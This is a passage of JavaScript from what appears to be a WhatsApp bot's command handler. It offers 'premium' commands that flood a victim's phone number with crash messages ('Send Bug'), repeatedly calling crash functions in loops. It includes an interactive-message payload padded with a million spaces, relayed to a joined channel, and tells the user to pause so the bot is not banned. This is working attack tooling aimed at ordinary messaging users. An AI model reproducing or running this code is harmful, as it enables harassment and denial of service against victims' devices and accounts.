await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case '🍌': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case '🎭': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case '👻': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'jomok-blank': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'mampuslu': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break

case 'goyang': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'jomok': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'kekuatanhitam': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break;
case 'cringe': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break

case 'bug-waweb': {
if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Usage .${command} 62xxxx`)
let anggazyyweb = q.replace(/[^0-9]/g, "")
if (anggazyyweb.startsWith('0')) return reply(`Example : .${command} 62xxxx`)
let target = anggazyyweb + '@s.whatsapp.net'
await reply(`In process....`)
for (let j = 0; j < 1; j++) {
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
await xeonkillpic(target, oneclickxeon)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
await xeonkillpic(target, oneclickxeon)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
await xeonkillpic(target, oneclickxeon)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
await xeonkillpic(target, oneclickxeon)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
await xeonkillpic(target, oneclickxeon)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
}
await reply(`Successfully Send Bug to ${anggazyyweb} Using ${command}. ✅`)
}
break
case "jids-unexpected": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
        case "devil-andro": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendVariousMessage(from, encodedValue);
  await sleep(2500); // Adjusted sleep time for clarity
  sendReaction('✅');
}
break;

case 'bug-saluran': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} https://whatsapp.com/channel/`)
reply(`In proses....`)
let result = args[0].split('https://whatsapp.com/channel/')[1];
let target = await anggazyy.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝙰𝚗𝚐𝚐𝚊𝚣𝚢𝚢 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #anggazyy666"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: anggazyycrash })
await anggazyy.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case "jids-lol": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "jids-system": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "jids-toui": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
